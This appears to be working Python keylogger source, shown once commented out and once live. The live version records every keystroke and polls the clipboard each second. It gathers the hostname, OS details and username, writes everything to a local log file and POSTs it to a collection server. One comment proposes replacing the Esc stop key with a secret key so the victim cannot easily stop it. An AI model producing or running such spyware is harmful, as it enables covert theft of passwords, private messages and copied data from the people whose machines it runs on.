# # keylogger.py

# from pynput.keyboard import Key, Listener
# import requests
# import platform
# import os
# import getpass

# count = 0
# keys = []
# device_info = {
#     "device": platform.node(),
#     "system": platform.system(),
#     "release": platform.release(),
#     "version": platform.version(),
#     "machine": platform.machine(),
#     "username": getpass.getuser(),
#     "current_path": os.getcwd()
# }

# def send_to_server(log):
#     url = 'http://127.0.0.1:5000/log'
#     data = {
#         "device_info": device_info,
#         "key_data": log
#     }
#     try:
#         requests.post(url, json=data)
#     except Exception as e:
#         print(f"Error sending data to server: {e}")

# def write_to_file(key):
#     key_data = str(key)
#     with open("keylog.txt", "a") as f:
#         f.write(key_data + "\n")
#     send_to_server(key_data)

# def on_press(key):
#     global keys, count

#     keys.append(str(key))
#     count += 1

#     if count >= 1:
#         count = 0
#         logs = format_logs(keys)
#         write_to_file(logs)
#         keys = []

# def format_logs(keys):
#     message = ""
#     for key in keys:
#         k = key.replace("'", "")
#         if key == "Key.space":
#             k = " "
#         elif key == "Key.shift":
#             k = "<shift>"
#         elif key == "Key.ctrl_l":
#             k = "<ctrl>"
#         elif key == "Key.alt_l":
#             k = "<alt>"
#         elif key == "Key.tab":
#             k = "<tab>"
#         elif key == "Key.caps_lock":
#             k = "<caps_lock>"
#         elif key == "Key.enter":
#             k = "<enter>"
#         elif key.find("Key") > 0:
#             k = ""
#         message += k
#     return message

# def on_release(key):
#     if key == Key.esc:
#         return False  # Stops the listener

# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()


from pynput.keyboard import Key, Listener
import requests
import platform
import os
import getpass
import pyperclip
import time
import threading

count = 0
keys = []
device_info = {
    "device": platform.node(),
    "system": platform.system(),
    "release": platform.release(),
    "version": platform.version(),
    "machine": platform.machine(),
    "username": getpass.getuser(),
    "current_path": os.getcwd()
}

def send_to_server(log):
    url = 'http://127.0.0.1:8080/log'
    data = {
        "device_info": device_info,
        "key_data": log
    }
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"Error sending data to server: {e}")

def write_to_file(key):
    key_data = str(key)
    with open("keylog.txt", "a") as f:
        f.write(key_data + "\n")
    send_to_server(key_data)

def on_press(key):
    global keys, count

    keys.append(str(key))
    count += 1

    if count >= 1:
        count = 0
        logs = format_logs(keys)
        write_to_file(logs)
        keys = []

def format_logs(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.shift":
            k = "<shift>"
        elif key == "Key.ctrl_l":
            k = "<ctrl>"
        elif key == "Key.alt_l":
            k = "<alt>"
        elif key == "Key.tab":
            k = "<tab>"
        elif key == "Key.caps_lock":
            k = "<caps_lock>"
        elif key == "Key.enter":
            k = "<enter>"
        elif key.find("Key") > 0:
            k = ""
        message += k
    return message

def on_release(key): #this is the function  by altering it to read a string we can easily set a secret key instead of esc
    if key == Key.esc:
        return False  # Stops the listener

def monitor_clipboard():
    recent_value = ""
    while True:
        tmp_value = pyperclip.paste()
        if tmp_value != recent_value:
            recent_value = tmp_value
            clipboard_data = f"[Clipboard] {recent_value}"
            write_to_file(clipboard_data)
        time.sleep(1)

# Start clipboard monitoring in a separate thread
clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
